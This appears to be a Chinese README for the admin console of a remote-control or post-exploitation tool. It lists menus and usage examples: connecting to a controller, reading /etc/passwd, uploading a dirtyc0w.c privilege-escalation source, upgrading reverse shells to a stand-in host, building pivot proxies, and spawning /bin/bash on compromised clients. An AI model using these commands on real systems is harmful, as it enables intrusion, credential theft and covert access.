## 管理端

1. 认证
2. 获取服务端信息
	* 版本号
	* 当前监听的服务
	* 每个服务上线的机器
3. 进入主菜单
	* 服务器
		* 增删改查
	* 客户端
		* 删查
	* 选择客户端
4. 进入客户端菜单
	* 列信息
	* 文件操作
		* 上传，下载
	* 隧道操作
		* 增删查
	* 交互式 Shell

### 命令

```
./admin
```

```
>> help
>> connect
	connect --host 1.3.3.7 --port 7331
>> auth
	auth --username admin --password admin
>> run
	run --host 192.168.1.1 --port 13337
>> info
	info --hash d41d8cd98f00b204e9800998ecf8427e
>> list
	list
>> delete
	delete --hash d41d8cd98f00b204e9800998ecf8427e
>> select
	common
		>> info
		>> back
		>> gather
			gather --all
			gather --suid
		>> download
			download --src /etc/passwd --dst ./passwd
		>> upload
			upload --src ./dirtyc0w.c --dst /tmp/dirtyc0w.c
	rsh
		>> upgrade
			upgrade --host 1.3.3.7 --port 7331
		>> pty
	termite
		>> proxy
			proxy --create --type pull --remote-host 192.168.1.1 --remote-port 22 --local-port 1022
			proxy --create --type push --local-host 127.0.0.1 --local-port 1080 --remote-port 1090
			proxy --create --type dynamic --local-port 1090
			proxy --create --type internet --remote-port 1090
			proxy --delete --id 1
			proxy --list
		>> interact
			interact --spawn /bin/bash
			interact --spawn vim /etc/passwd
>> exit
```